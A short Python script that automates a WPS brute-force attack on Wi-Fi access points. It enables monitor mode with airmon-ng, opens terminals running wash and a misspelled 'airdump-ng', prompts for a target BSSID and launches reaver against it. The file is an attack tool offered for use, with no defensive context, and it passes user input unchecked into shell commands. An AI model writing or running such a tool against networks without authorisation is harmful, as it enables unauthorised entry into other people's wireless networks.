import os
import sys
from termcolor import colored
import time

def reav():
	card = 'airmon-ng start wlan0'
	os.system(card)
	wash = 'wash -i wlan0mon'
	gt2 = 'gnome-terminal ' + wash
	os.system(gt2)
	dump = 'airdump-ng wlan0mon'
	gt = 'gnome-terminal ' + dump
	os.system(gt)
	time.sleep(3)

	bssid = input('What Is The BSSID:\n> ')
	rvr = 'reaver -i wlan0mon -b ' + bssid + ' -vv'
	gt3 = 'gnome-terminal ' + rvr
	os.system(gt3)
